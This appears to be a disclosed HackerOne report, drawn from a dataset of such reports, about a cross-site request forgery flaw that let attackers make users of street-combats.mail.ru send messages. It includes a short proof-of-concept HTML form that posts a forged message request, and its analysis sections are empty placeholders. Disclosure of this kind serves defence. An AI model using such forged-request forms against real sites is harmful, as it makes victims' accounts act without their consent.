---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '196715'
original_report_id: '196715'
title: CSRF Send a message at street-combats.mail.ru
weakness: Cross-Site Request Forgery (CSRF)
team_handle: mailru
created_at: '2017-01-08T11:53:48.387Z'
disclosed_at: '2017-03-17T13:07:29.800Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 9
tags:
- hackerone
- cross-site-request-forgery-csrf
---

# CSRF Send a message at street-combats.mail.ru

## Metadata

- HackerOne Report ID: 196715
- Weakness: Cross-Site Request Forgery (CSRF)
- Program: mailru
- Disclosed At: 2017-03-17T13:07:29.800Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Hi again, 

I have that there is no CSRF token when sending a new message so you can CSRF anyone and make him send a message to anyone :)

this is the code

```
<html>
  <body>
    <form action="https://street-combats.mail.ru/message/" method="POST">
      <input type="hidden" name="recipient" value="[To]" />
      <input type="hidden" name="body" value="[Message-Body]" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

```

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
